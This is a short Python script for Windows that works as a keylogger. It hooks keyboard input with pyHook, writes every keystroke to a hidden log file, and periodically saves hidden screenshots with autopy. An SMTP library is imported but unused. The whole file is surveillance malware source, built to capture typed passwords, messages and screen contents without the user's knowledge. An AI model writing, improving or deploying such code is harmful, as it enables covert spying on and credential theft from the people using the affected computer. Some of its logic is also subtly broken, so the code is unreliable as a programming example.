import pyHook,sys,pythoncom,win32console
import smtplib,logging,os,autopy
import threading
from datetime import datetime
import win32api, win32con
i = 0
def screenshot():
	global i
	n = datetime.now()
	if n.minute % 3 == 0 :
		i += 1
		s = "name"+str(i)+".png";
		bitmap = autopy.bitmap.capture_screen()
		bitmap.save('B:\\works\{}'.format(s))
		win32api.SetFileAttributes(s,win32con.FILE_ATTRIBUTE_HIDDEN)
#	threading.Timer(60, screenshot).start()
def OnKeyboardEvent(event):
	if event.Ascii !=0 or 8:
		screenshot()		
		file_log = 'B:\\systemlog.txt' 
		if os.path.isfile(file_log) != True:
			f = open(file_log,'w')
			f.write(chr(event.Ascii))
			f.close()
			win32api.SetFileAttributes(file_log,win32con.FILE_ATTRIBUTE_HIDDEN)
		else:
			f = open(file_log,'r+')
			save = f.read()
			f.close()
			k=chr(event.Ascii)
			if event.Ascii==13:
				k='\n'    
			if event.Ascii==32:
				k='  '
			save += k
			f = open(file_log,'r+')
			f.write(save)
			f.close()
	return True
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()